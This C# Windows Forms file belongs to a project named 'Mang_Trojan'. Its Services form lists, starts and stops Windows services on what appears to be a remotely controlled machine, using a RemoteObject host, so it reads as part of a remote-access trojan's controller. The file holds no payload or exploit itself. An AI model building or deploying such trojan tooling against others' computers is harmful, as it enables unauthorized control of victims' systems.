using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class Services : Form
    {
        RemoteObject.ScreenObject hostInstance;
        private ListViewColumnSorter sorter;
        private ListViewHitTestInfo selected;

        public Services(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            sorter = new ListViewColumnSorter();
            listView1.ListViewItemSorter = sorter;
            Renew();
        }

        private void Renew()
        {
            listView1.Items.Clear();
            string service = hostInstance.GetServices();
            string[] rows = service.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);

            foreach (string row in rows)
            {
                if (row != string.Empty)
                {
                    string[] fields = row.Split(new string[] { "|*|" }, StringSplitOptions.RemoveEmptyEntries);
                    ListViewItem item = new ListViewItem(fields[0]);
                    for (int i = 1; i < fields.Length; i++)
                    {
                        item.SubItems.Add(fields[i]);
                    }
                    listView1.Items.Add(item);
                }
            }
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = listView1.HitTest(e.X, e.Y);
                contextMenuStrip1.Show(listView1, e.Location);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Renew();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item.SubItems[1].Text == "Running")
            {
                MessageBox.Show(selected.Item.Text + " Đang chạy!!");
            }
            else
            {
                hostInstance.StartService(selected.Item.Text);
                Renew();
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (selected.Item.SubItems[1].Text == "Stopped")
            {
                MessageBox.Show(selected.Item.Text + " đang chạy.");
            }
            else
            {
                hostInstance.StopService(selected.Item.Text);
                Renew();
            }
        }
    }
}
